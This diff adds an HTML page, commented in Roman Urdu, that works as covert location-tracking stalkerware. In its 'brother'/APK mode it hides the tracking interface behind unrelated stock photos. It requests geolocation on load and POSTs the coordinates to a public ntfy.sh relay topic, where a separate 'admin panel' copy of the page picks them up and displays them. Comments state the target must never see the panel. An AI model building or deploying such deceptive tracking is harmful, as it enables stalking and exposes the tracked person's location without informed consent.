@@ -1,0 +1,513 @@
+<!doctype html>
+<html lang="ur">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<meta name="color-scheme" content="light dark" />
+<link rel="icon" href="data:," />
+<title>Location</title>
+<style>
+  :root{
+    --bg:#f2faf3;
+    --text:#14231a;
+    --green:#16a34a;
+    --green-dark:#15803d;
+    --grey:#94a3b8;
+    --card:#ffffff;
+    --warn:#b45309;
+    --line:rgba(20,35,26,.12);
+  }
+  @media (prefers-color-scheme: dark){
+    :root{ --bg:#0b1710; --text:#eef7f0; --card:#15241a; --warn:#fbbf24; --line:rgba(238,247,240,.16); }
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; background:var(--bg); color:var(--text);
+    font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
+    min-height:100svh;
+  }
+  main{
+    min-height:100svh;
+    max-width:480px; margin:0 auto;
+    padding:32px 20px 36px;
+    display:flex; flex-direction:column; align-items:center; justify-content:center; gap:28px;
+    text-align:center;
+  }
+
+  /* Bara pin — yahi page ki pehchan hai, parhna nahi parega */
+  .hero{position:relative; width:190px; height:190px; display:grid; place-items:center}
+  .hero .ring{
+    position:absolute; inset:0; border-radius:50%;
+    background:rgba(22,163,74,.14);
+    animation:pulse 1.8s ease-out infinite;
+  }
+  .hero .circle{
+    width:168px; height:168px; border-radius:50%;
+    background:var(--green);
+    display:grid; place-items:center;
+    box-shadow:0 18px 36px rgba(22,163,74,.38);
+    transition:background .3s;
+  }
+  .hero svg{width:96px; height:96px; fill:#fff}
+  .hero.off .circle{background:var(--grey); box-shadow:0 14px 28px rgba(100,116,139,.3)}
+  .hero.done .circle{background:var(--green)}
+  .hero .slash{
+    display:none; position:absolute; width:150px; height:10px; border-radius:99px;
+    background:#ef4444; transform:rotate(-38deg);
+  }
+  .hero.off .slash{display:block}
+  .hero .check{display:none}
+  .hero.done .pin-ic{display:none}
+  .hero.done .check{display:block}
+
+  @keyframes pulse{
+    0%{transform:scale(.82); opacity:.9}
+    70%{transform:scale(1.08); opacity:0}
+    100%{transform:scale(1.08); opacity:0}
+  }
+  @media (prefers-reduced-motion: reduce){
+    .hero .ring{animation:none; opacity:0}
+  }
+
+  /* Ek hi bara hara button */
+  .big-btn{
+    width:100%; max-width:360px; min-height:108px;
+    border:none; border-radius:28px; cursor:pointer;
+    background:var(--green); color:#fff;
+    display:flex; align-items:center; justify-content:center; gap:14px;
+    box-shadow:0 16px 32px rgba(22,163,74,.42);
+    -webkit-tap-highlight-color:transparent;
+    padding:16px;
+  }
+  .big-btn:active{background:var(--green-dark); transform:scale(.98)}
+  .big-btn svg{width:52px; height:52px; fill:#fff; flex:0 0 auto}
+  .big-btn .tap{width:44px; height:44px; opacity:.95}
+
+  /* Chrome me kholne wala button — sirf WhatsApp wale browser me dikhega */
+  .chrome-btn{
+    display:flex;
+    width:100%; max-width:360px; min-height:92px;
+    border:2.5px solid #dadce0; border-radius:28px; cursor:pointer;
+    background:var(--card);
+    align-items:center; justify-content:center; gap:14px;
+    box-shadow:0 10px 24px rgba(0,0,0,.10);
+    -webkit-tap-highlight-color:transparent;
+    padding:14px 16px;
+  }
+  .chrome-btn.show{display:flex}
+  .chrome-btn svg{width:52px; height:52px; flex:0 0 auto}
+  .chrome-btn .go{font-size:34px; font-weight:900; color:var(--green); line-height:1}
+
+  /* Location milne ke baad wala hissa — pehle chhupa rehta hai */
+  .done-panel{display:none; width:100%; max-width:360px; flex-direction:column; gap:14px}
+  .done-panel.show{display:flex}
+  .maps-btn,.wa-btn{
+    display:flex; align-items:center; justify-content:center; gap:14px;
+    width:100%; min-height:88px; padding:14px 16px; border-radius:26px;
+    text-decoration:none; -webkit-tap-highlight-color:transparent;
+  }
+  .maps-btn{background:var(--card); border:2.5px solid #dadce0; box-shadow:0 10px 24px rgba(0,0,0,.10)}
+  .maps-btn svg{width:48px; height:48px; flex:0 0 auto}
+  .wa-btn{background:#25D366; box-shadow:0 14px 28px rgba(37,211,102,.4)}
+  .wa-btn svg{width:50px; height:50px; fill:#fff; flex:0 0 auto}
+  .done-panel .go{font-size:32px; font-weight:900; color:var(--green); line-height:1}
+  .wa-btn .go{color:#fff}
+
+  /* Live Panel — dusre phone se aayi hui location yahan dikhti hai */
+  .live-panel{
+    width:100%; max-width:360px; text-align:left;
+    background:var(--card); border:2.5px solid rgba(22,163,74,.45);
+    border-radius:24px; padding:18px;
+    box-shadow:0 10px 24px rgba(0,0,0,.08);
+  }
+  .live-title{margin:0 0 8px; font-size:22px; font-weight:800; display:flex; align-items:center; gap:10px; line-height:1.25}
+  .live-dot{width:14px; height:14px; border-radius:50%; background:#f59e0b; flex:0 0 auto; animation:blink 1.2s ease-in-out infinite}
+  .live-panel.got .live-dot{background:var(--green); animation:none}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+  @media (prefers-reduced-motion: reduce){ .live-dot{animation:none} }
+  .live-status{margin:0 0 6px; font-size:16px; font-weight:600; line-height:1.5; opacity:.85}
+  .live-empty{margin:6px 0 0; font-size:15px; font-weight:600; opacity:.55}
+  .live-item{border-top:1.5px solid var(--line); padding:12px 0 6px; margin-top:10px}
+  .live-map{
+    display:flex; align-items:center; justify-content:center; gap:10px;
+    background:var(--green); color:#fff; text-decoration:none;
+    font-size:19px; font-weight:800; line-height:1.25;
+    min-height:60px; border-radius:16px; padding:10px 12px; text-align:center;
+    -webkit-tap-highlight-color:transparent;
+  }
+  .live-map:active{background:var(--green-dark)}
+  .live-map svg{width:26px; height:26px; fill:#fff; flex:0 0 auto}
+  .live-meta{font-size:14px; font-weight:600; opacity:.65; margin-top:8px; line-height:1.5; word-break:break-word}
+  .live-warn{margin:14px 0 0; font-size:14.5px; font-weight:700; line-height:1.55; color:var(--warn)}
+
+  /* Na ke barabar lafz — sirf aik chhoti line, woh bhi neeche */
+  .tiny{font-size:15px; font-weight:600; opacity:.55; margin:0; line-height:1.4}
+  .fmd{
+    font-size:16px; font-weight:700; line-height:1.5; opacity:.75; margin:0;
+    max-width:360px;
+  }
+  .visually-hidden{position:absolute; width:1px; height:1px; overflow:hidden; clip:rect(0 0 0 0); white-space:nowrap}
+
+  /* Error screen — sirf APK (file://) mode me, Allow ke baad bhai ko yahi dikhta hai.
+     Panel, Maps link aur WhatsApp button is mode me kabhi nahi dikhte. */
+  .error-screen{
+    display:none; min-height:100svh; max-width:480px; margin:0 auto;
+    padding:32px 20px 36px;
+    flex-direction:column; align-items:center; justify-content:center; gap:24px;
+    text-align:center;
+  }
+  .error-screen.show{display:flex}
+  .error-screen .err-circle{
+    width:168px; height:168px; border-radius:50%;
+    background:#dc2626; display:grid; place-items:center;
+    box-shadow:0 18px 36px rgba(220,38,38,.38);
+    font-size:96px; font-weight:900; color:#fff; line-height:1;
+  }
+  .error-screen .err-text{font-size:26px; font-weight:800; line-height:1.4; margin:0}
+  .error-screen .err-sub{font-size:17px; font-weight:600; line-height:1.5; opacity:.7; margin:0}
+</style>
+</head>
+<body>
+<main aria-label="Location On Karo">
+  <!-- Bara pin icon -->
+  <div class="hero" id="hero" role="img" aria-label="Location">
+    <div class="ring" aria-hidden="true"></div>
+    <div class="circle">
+      <svg class="pin-ic" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C8.1 2 5 5.1 5 9c0 5.2 7 13 7 13s7-7.8 7-13c0-3.9-3.1-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6.5a2.5 2.5 0 0 1 0 5z"/></svg>
+      <svg class="check" viewBox="0 0 24 24" aria-hidden="true"><path d="M9.2 16.6 4.8 12.2l-1.7 1.7 6.1 6.1L21.3 7.9l-1.7-1.7z"/></svg>
+    </div>
+    <div class="slash" aria-hidden="true"></div>
+  </div>
+
+  <!-- Ek bara hara button -->
+  <button class="big-btn" id="mainBtn" type="button" aria-label="Location On Karo">
+    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C8.1 2 5 5.1 5 9c0 5.2 7 13 7 13s7-7.8 7-13c0-3.9-3.1-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6.5a2.5 2.5 0 0 1 0 5z"/></svg>
+    <svg class="tap" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 11.2V5a1.8 1.8 0 0 1 3.6 0v4.6l.7.1V6.6a1.7 1.7 0 0 1 3.4 0v3.6l.6.2V7.8a1.7 1.7 0 0 1 3.4 0v7.1c0 3.8-2.8 6.1-6.2 6.1-2.7 0-4.2-1-6-3.6L5.6 13c-.6-1-.5-2 .1-2.6.6-.5 1.6-.4 2.2.3l1.1 1.2v-.7z"/></svg>
+  </button>
+
+  <!-- Chrome wala button: sirf tab, jab page WhatsApp ke andar wale browser me khula ho -->
+  <button class="chrome-btn" id="chromeBtn" type="button" aria-label="Chrome me kholo">
+    <svg viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#EA4335" d="M24 24 L5.5 14.5 A21 21 0 0 1 42.5 14.5 Z"/>
+      <path fill="#FBBC05" d="M24 24 L42.5 14.5 A21 21 0 0 1 34.5 41 Z"/>
+      <path fill="#34A853" d="M24 24 L34.5 41 A21 21 0 0 1 5.5 14.5 Z"/>
+      <circle cx="24" cy="24" r="10" fill="#fff"/>
+      <circle cx="24" cy="24" r="8.2" fill="#4285F4"/>
+    </svg>
+    <span class="go">➜</span>
+  </button>
+
+  <!-- Location mil jaye to ye dikhega: Maps link + WhatsApp bhejne wala button -->
+  <div class="done-panel" id="donePanel">
+    <a class="maps-btn" id="mapsLink" href="#" target="_blank" rel="noopener" aria-label="Google Maps me dekho">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#EA4335" d="M12 2C8.1 2 5 5.1 5 9c0 5.2 7 13 7 13s7-7.8 7-13c0-3.9-3.1-7-7-7z"/><circle cx="12" cy="9" r="2.6" fill="#fff"/></svg>
+      <span class="go">➜</span>
+    </a>
+    <a class="wa-btn" id="waLink" href="#" target="_blank" rel="noopener" aria-label="WhatsApp par location bhejo">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2a10 10 0 0 0-8.6 15.1L2 22l5-1.3A10 10 0 1 0 12 2zm5.2 14.2c-.2.6-1.3 1.2-1.8 1.2-.5.1-1 .2-3.4-.7-2.9-1.2-4.7-4.1-4.9-4.3-.1-.2-1.1-1.5-1.1-2.9s.7-2 1-2.3c.2-.3.5-.3.7-.3h.5c.2 0 .4 0 .6.5s.8 1.9.8 2c.1.1.1.3 0 .5-.3.6-.6.8-.4 1.1.7 1.2 1.6 2 2.8 2.6.3.2.5.1.7-.1l.9-1c.2-.3.4-.2.7-.1l2 .9c.3.2.5.3.6.4 0 .1 0 .7-.2 1.2z"/></svg>
+      <span class="go">➜</span>
+    </a>
+  </div>
+
+  <!-- Panel: dusre phone se Allow hote hi location ka Maps link yahan khud aa jata hai -->
+  <section class="live-panel" id="livePanel" aria-label="Location Panel">
+    <h2 class="live-title"><span class="live-dot" id="liveDot" aria-hidden="true"></span> Location Panel</h2>
+    <p class="live-status" id="liveStatus">Intezaar ho raha hai… Dusre phone par Allow hote hi location ka Maps link yahan khud aa jayega.</p>
+    <div id="liveList">
+      <p class="live-empty" id="liveEmpty">Abhi tak koi location nahi aayi.</p>
+    </div>
+    <p class="live-warn">Khayal rakho: ye link jisko bhi milega, wo is panel me aane wali location dekh sakta hai. Link sirf usi ko bhejo jis par pura bharosa hai.</p>
+  </section>
+
+  <p class="tiny" aria-hidden="true">Allow dabao</p>
+  <p class="fmd">Jab hara button daba kar khulne wali screen par <b>switch ON</b> kar do ge, to <b>Find My Device</b> me bhi phone ki location dikhne lagegi — wahan se bhi pata chal jayega ke phone ghar me hi para hai.</p>
+</main>
+
+<!-- Picture screen — sirf bhai wale link (?brother=1 / APK) me dikhta hai.
+     Location wala interface is me bilkul nahi dikhta, sirf ye picture dikhti hai.
+     Location background me khud mangi jati hai aur admin panel ko bheji jati hai. -->
+<div id="picScreen" style="display:none;position:fixed;inset:0;background:#000;z-index:5;">
+  <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?q=80&w=1200&auto=format&fit=crop" alt="" style="width:100%;height:100%;object-fit:cover;display:block">
+</div>
+
+<!-- Dusri picture — Allow ke baad error ki jagah ye dikhti hai (bhai mode me) -->
+<div id="picScreen2" style="display:none;position:fixed;inset:0;background:#000;z-index:6;">
+  <img src="https://images.unsplash.com/photo-1543466835-00a7907e9de1?q=80&w=1200&auto=format&fit=crop" alt="" style="width:100%;height:100%;object-fit:cover;display:block">
+</div>
+
+<!-- Error screen — sirf APK mode me Allow ke baad dikhta hai, panel ki jagah -->
+<div class="error-screen" id="errorScreen" role="alert">
+  <div class="err-circle" aria-hidden="true">✕</div>
+  <p class="err-text">Error: Location nahi mili, dobara koshish karo</p>
+  <p class="err-sub">Kuch ghalat ho gaya hai. Baad me dobara koshish karo.</p>
+</div>
+
+<script>
+  /* APK mode pehchano: APK me page file:// se khulta hai, Muse card me https:// se.
+     APK mode me bhai ko panel kabhi nahi dikhana — na pehle, na Allow ke baad. */
+  var isApk = (window.location.protocol === 'file:') || /[?&]brother=1/.test(window.location.search || '');
+  /* Pehli picture kam se kam 10 second nazar aani chahiye */
+  var pageLoadTime = Date.now();
+  /* Bhai wale link par location wala interface bilkul chhupao, sirf picture dikhao */
+  if (isApk) {
+    var picEl = document.getElementById('picScreen');
+    if (picEl) picEl.style.display = 'block';
+    var mainEl0 = document.querySelector('main');
+    if (mainEl0) mainEl0.style.display = 'none';
+  }
+  var errorScreen = document.getElementById('errorScreen');
+  var hero = document.getElementById('hero');
+  var mainBtn = document.getElementById('mainBtn');
+  var chromeBtn = document.getElementById('chromeBtn');
+  var state = 'waiting'; // waiting | done | off
+  var triedSettings = false;
+
+  /* --- WhatsApp ke andar wala browser pehchano --- */
+  var ua = navigator.userAgent || '';
+  var inAppBrowser = /WhatsApp/i.test(ua) || /;\s*wv\)/.test(ua) || (/Android/i.test(ua) && /Version\/[\d.]+/i.test(ua) && /Chrome/i.test(ua) && !/Chrome\/[\d]+ Mobile/i.test(ua) === false && /;\s*wv/.test(ua));
+  // Seedha check: WebView me "; wv)" hota hai
+  if (/;\s*wv\)/.test(ua) || /WhatsApp/i.test(ua)) inAppBrowser = true;
+  if (inAppBrowser) chromeBtn.classList.add('show');
+
+  chromeBtn.addEventListener('click', function(){
+    // Isi page ko Chrome me kholo — parhne ki zaroorat nahi, Chrome khud khulega
+    var url = window.location.href;
+    var noScheme = url.replace(/^https?:\/\//, '');
+    var intent = 'intent://' + noScheme + '#Intent;scheme=https;package=com.android.chrome;end';
+    window.location.href = intent;
+    setTimeout(function(){
+      // Agar Chrome intent na chale to googlechrome scheme try karo
+      if (!document.hidden) window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(url);
+    }, 900);
+  });
+
+  /* --- Location mangna --- */
+  var donePanel = document.getElementById('donePanel');
+  var mapsLink = document.getElementById('mapsLink');
+  var waLink = document.getElementById('waLink');
+
+  function showDone(pos){
+    state = 'done';
+    if (navigator.vibrate) { try { navigator.vibrate(200); } catch(e){} }
+    if (pos && pos.coords) {
+      var lat = pos.coords.latitude;
+      var lng = pos.coords.longitude;
+      /* Pehle location bhejo — ye kabhi nahi rukni, chahe screen par kuch bhi dikhe */
+      sendToRelay(lat, lng, pos.coords.accuracy);
+      if (isApk) {
+        /* APK (bhai) mode: panel, Maps link, WhatsApp button — kuch nahi dikhana.
+           Poora page aur pehli picture chhupao aur error ki jagah dusri picture
+           dikhao. Location pehle hi relay par ja chuki hai, admin panel me link
+           aa jayega. Pehli picture kam se kam 10 second nazar aaye — agar location
+           jaldi mil jaye to dusri picture tabhi aaye jab 10 second poore hon. */
+        var showNextPic = function() {
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.style.display = 'none';
+          var picEl2 = document.getElementById('picScreen');
+          if (picEl2) picEl2.style.display = 'none';
+          var pic2 = document.getElementById('picScreen2');
+          if (pic2) pic2.style.display = 'block';
+        };
+        var elapsed = Date.now() - pageLoadTime;
+        if (elapsed >= 10000) { showNextPic(); }
+        else { setTimeout(showNextPic, 10000 - elapsed); }
+        return;
+      }
+      hero.classList.remove('off');
+      hero.classList.add('done');
+      var mapsUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
+      mapsLink.href = mapsUrl;
+      waLink.href = 'https://wa.me/?text=' + encodeURIComponent('Meri location: ' + mapsUrl);
+      donePanel.classList.add('show');
+      addPanelEntry(lat, lng, pos.coords.accuracy);
+      setTimeout(function(){ donePanel.scrollIntoView({behavior:'smooth', block:'center'}); }, 350);
+    }
+  }
+  function showOff(){
+    state = 'off';
+    hero.classList.remove('done');
+    hero.classList.add('off');
+  }
+
+  var locRetries = 0;
+  function requestLocation(){
+    if (!('geolocation' in navigator)) { showOff(); return; }
+    if (state === 'done') return;
+    navigator.geolocation.getCurrentPosition(function(pos){
+      locRetries = 0;
+      showDone(pos);
+    }, function(err){
+      // Permission denied (code 1) ho to dobara na mango — user ne mana kiya hai.
+      if (err && err.code === 1) { showOff(); return; }
+      // Ghar ke andar GPS fix 12 second me nahi milta, is liye network location
+      // (enableHighAccuracy false, 30 second timeout) aur khud dobara koshish.
+      locRetries++;
+      if (locRetries <= 10) {
+        setTimeout(requestLocation, 3000);
+      } else {
+        showOff();
+      }
+    }, { enableHighAccuracy:false, timeout:30000, maximumAge:0 });
+  }
+
+  function openSettings(){
+    triedSettings = true;
+    window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+  }
+
+  /* Bara hara button:
+     - Pehli dafa: location mango (Allow wala box ayega)
+     - Agar location band nikli: Location wali screen khol do (switch wali) */
+  mainBtn.addEventListener('click', function(){
+    if (state === 'done') return;
+    if (state === 'off') {
+      openSettings();
+    } else {
+      requestLocation();
+    }
+  });
+
+  /* Page khulte hi khud location mango — bhai ko sirf Allow dabana hai */
+  window.addEventListener('load', function(){
+    setTimeout(requestLocation, 350);
+  });
+
+  /* Settings se wapas aaye to khud dobara check karo */
+  document.addEventListener('visibilitychange', function(){
+    if (!document.hidden && (triedSettings || state === 'off')) {
+      triedSettings = false;
+      setTimeout(requestLocation, 400);
+    }
+  });
+  window.addEventListener('pageshow', function(){
+    if (state === 'off') setTimeout(requestLocation, 400);
+  });
+
+  /* ============================================================
+     PUBLIC RELAY (ntfy.sh) — user ne khud ijazat di hai.
+     Ek random mushkil topic hai. Is phone par Allow hote hi
+     location us topic par POST ho jati hai, aur jis phone par
+     ye page khula ho wahan ka panel usi topic ko EventSource
+     aur polling se sun kar Maps ka link dikha deta hai.
+     Bhai ko kuch bhejna nahi — sirf Allow dabana hai.
+     Note: topic public relay hai — link jisko milega wo
+     location dekh sakta hai (page par saaf likha hai).
+     ============================================================ */
+  var RELAY_TOPIC = 'zacky-loc-2f44d32f4429aecbc3f2c869d9f697c1';
+  var RELAY_URL = 'https://ntfy.sh/' + RELAY_TOPIC;
+  var relaySeenIds = {};
+  var relaySentKey = '';
+
+  function sendToRelay(lat, lng, acc){
+    var key = lat.toFixed(5) + ',' + lng.toFixed(5);
+    if (relaySentKey === key) return;
+    relaySentKey = key;
+    try {
+      var payload = JSON.stringify({ lat: lat, lng: lng, acc: acc ? Math.round(acc) : null, t: Date.now() });
+      fetch(RELAY_URL, {
+        method: 'POST',
+        body: payload,
+        headers: { 'Title': 'Location mil gayi' }
+      }).catch(function(){});
+    } catch(e){}
+  }
+
+  function handleRelayData(data){
+    if (!data) return;
+    if (data.id) {
+      if (relaySeenIds[data.id]) return;
+      relaySeenIds[data.id] = true;
+    }
+    if (data.event && data.event !== 'message') return;
+    var msg = data.message;
+    if (!msg) return;
+    var obj = null;
+    try { obj = JSON.parse(msg); } catch(e){}
+    if (obj && typeof obj.lat === 'number' && typeof obj.lng === 'number') {
+      addPanelEntry(obj.lat, obj.lng, obj.acc, obj.t);
+      return;
+    }
+    // Agar message seedha "lat,lng" ki surat me aaye to wo bhi parh lo
+    var m = /(-?\d{1,3}\.\d+)\s*,\s*(-?\d{1,3}\.\d+)/.exec(msg);
+    if (m) addPanelEntry(parseFloat(m[1]), parseFloat(m[2]), null, data.time ? data.time * 1000 : null);
+  }
+
+  function startRelay(){
+    // 1) EventSource — foran wali live sunwai
+    try {
+      var es = new EventSource(RELAY_URL + '/sse');
+      es.onmessage = function(ev){
+        try { handleRelayData(JSON.parse(ev.data)); } catch(e){}
+      };
+    } catch(e){}
+    // 2) Polling — backup, har 8 second me nayi location check karo
+    function poll(){
+      try {
+        fetch(RELAY_URL + '/json?poll=1', { cache: 'no-store' })
+          .then(function(r){ return r.text(); })
+          .then(function(txt){
+            txt.split('\n').forEach(function(line){
+              line = line.trim();
+              if (!line) return;
+              try { handleRelayData(JSON.parse(line)); } catch(e){}
+            });
+          })
+          .catch(function(){});
+      } catch(e){}
+    }
+    poll();
+    setInterval(poll, 8000);
+  }
+  var livePanel = document.getElementById('livePanel');
+  var liveStatus = document.getElementById('liveStatus');
+  var liveList = document.getElementById('liveList');
+  var liveEmpty = document.getElementById('liveEmpty');
+  var seenKeys = {};
+  var gotAny = false;
+
+  function addPanelEntry(lat, lng, acc, ts){
+    var dedupe = lat.toFixed(5) + ',' + lng.toFixed(5);
+    if (seenKeys[dedupe]) return;
+    seenKeys[dedupe] = true;
+
+    var mapsUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
+    var when = new Date(ts || Date.now()).toLocaleString('en-GB', { day:'numeric', month:'short', hour:'numeric', minute:'2-digit', hour12:true });
+
+    var item = document.createElement('div');
+    item.className = 'live-item';
+    var a = document.createElement('a');
+    a.className = 'live-map';
+    a.href = mapsUrl;
+    a.target = '_blank';
+    a.rel = 'noopener';
+    a.setAttribute('aria-label', 'Google Maps me location kholo');
+    a.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C8.1 2 5 5.1 5 9c0 5.2 7 13 7 13s7-7.8 7-13c0-3.9-3.1-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6.5a2.5 2.5 0 0 1 0 5z"/></svg>';
+    a.appendChild(document.createTextNode('Google Maps me Kholo \u279C'));
+    var meta = document.createElement('p');
+    meta.className = 'live-meta';
+    meta.textContent = 'Time: ' + when + '  \u2022  ' + lat.toFixed(5) + ', ' + lng.toFixed(5) + (acc ? '  \u2022  Accuracy ~' + Math.round(acc) + ' meter' : '');
+    item.appendChild(a);
+    item.appendChild(meta);
+
+    if (liveEmpty) { liveEmpty.remove(); liveEmpty = null; }
+    if (liveList.firstChild) liveList.insertBefore(item, liveList.firstChild);
+    else liveList.appendChild(item);
+
+    livePanel.classList.add('got');
+    liveStatus.textContent = 'Location aa gayi! Neeche wale hare button se Google Maps me kholo.';
+    if (!gotAny) {
+      gotAny = true;
+      setTimeout(function(){ livePanel.scrollIntoView({behavior:'smooth', block:'center'}); }, 600);
+    }
+  }
+
+  /* APK mode me panel shuru se hi chhupa do — bhai ko panel kabhi nazar na aaye.
+     Relay sunna phir bhi chalta rahega (background me, dikhega nahi). */
+  if (isApk && livePanel) livePanel.style.display = 'none';
+
+  /* Page khulte hi relay sunna shuru — dusre phone ki location
+     khud is panel me aati rahegi */
+  startRelay();
+</script>
+</body>
+</html>
